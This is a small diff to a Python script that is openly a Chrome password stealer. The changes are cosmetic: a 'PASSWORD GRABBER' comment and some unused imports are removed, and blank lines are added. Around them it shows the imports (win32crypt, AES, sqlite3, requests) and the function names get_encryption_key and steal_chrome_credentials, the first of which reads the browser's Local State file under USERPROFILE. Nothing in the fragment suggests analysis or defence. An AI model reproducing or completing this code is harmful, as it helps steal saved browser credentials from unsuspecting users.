@@ -1,12 +1,10 @@
-# -*- coding: utf-8 -*-
-import os, sqlite3, shutil, time, json, base64
+import os, sqlite3, shutil, base64
 from datetime import datetime
 from Crypto.Cipher import AES
 import win32crypt
 import requests
 
 
-# ====== PASSWORD GRABBER ======
 def get_encryption_key():
     try:
         local_state_path = os.path.join(os.environ['USERPROFILE'],
@@ -76,6 +74,7 @@ def steal_chrome_credentials():
     except Exception as e:
         print(f"🔥 CRITICAL ERROR: {str(e)}")
         return []
+
 
 
 
